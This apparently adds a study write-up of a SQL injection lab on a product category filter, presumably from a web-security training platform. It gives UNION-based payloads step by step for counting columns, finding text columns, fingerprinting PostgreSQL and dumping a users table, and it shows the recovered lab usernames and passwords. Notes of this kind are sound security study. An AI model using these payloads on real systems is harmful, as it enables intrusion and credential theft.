@@ -1,0 +1,40 @@
+SQLI - Product Category Filter
+
+End Goal: Retrieve all usernames and passwords and login as admin user
+
+Analysis:
+--------
+
+(1) Find the number of columns that the vulnerable app is using :
+' order by 1-- --> not displayed on page
+' order by 2-- --> column is displayed on the page
+' order by 3-- --> Internal Server Error
+
+3 - 1 =  2 --> The app is using 2 columns
+
+(2) Find which columns contain text. We need to figure this out because our desired output will be in strings i.e usernames/password so we need to find columons
+that accept strings. 
+' UNION SELECT 'a', NULL--
+' UNION SELECT NULL, 'a'-- --> This column returned a value in the output of the webpage. So we know that column (2) accepts a string
+
+(3) Output data from other tables
+
+' UNION select NULL, username from users--
+' UNION select NULL, password from users--
+
+Figure out the type of database the app is using. Inject the version command into the query (refer to sqli cheat sheet)
+' UNION select NULL, version()-- --> verifies that the app is running PostgreSQL 11.11 (Debian 11.11-1.pgdg90+1) on x86_64-pc-linux-gnu, 
+compiled by gcc (Debian 6.3.0-18+deb9u1) 6.3.0 20170516, 64-bit
+
+We want the output to display both username and password in one command - so we have to use string concatenation. Since we know this is running PostgreSQL we 
+can look up the syntax and inject it into our payload
+
+
+' UNION select NULL, username||'**'|| password from users-- 
+
+Output:
+carlos**p0d8oq72hccznuzwkolc
+administrator**7isclafowoz5axrmh225
+wiener**wa0z06xqi4hs8s1dfhzs
+
+
